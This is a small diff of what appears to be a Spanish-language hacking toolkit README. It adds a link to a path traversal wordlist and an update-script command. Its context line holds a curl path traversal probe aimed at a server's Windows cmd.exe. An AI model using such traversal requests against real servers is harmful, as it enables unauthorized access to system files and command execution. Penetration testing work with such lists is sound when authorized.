@@ -18,8 +18,9 @@ curl --path-as-is -k -v http://ip:80/../../../../../../windows/system32/cmd.exe
 
 ## diccionario path traversal 
 
+https://github.com/hackingyseguridad/diccionarios/blob/master/pathtraversal.txt
 
-
+sh actualizar.sh 
 
 
 ## http://www.hackingyseguridad.com
